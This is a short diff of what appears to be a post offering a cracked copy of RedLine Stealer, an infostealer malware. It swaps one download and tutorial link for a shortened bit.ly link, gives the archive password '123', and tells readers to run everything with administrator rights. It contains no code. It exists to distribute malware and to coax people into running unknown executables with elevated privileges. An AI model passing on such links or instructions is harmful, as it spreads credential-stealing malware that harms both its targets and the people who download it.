@@ -1,7 +1,6 @@
 Hi guys, this is the last version of redline stealer cracked.
 
-how to use/download: https://www.upload.ee/files/14476789/RedlineStealer.mp4.html
-
+tuturial how to use redline steale/download: https://bit.ly/3Ojhqp2
 the password is 123
 
 run all with admin
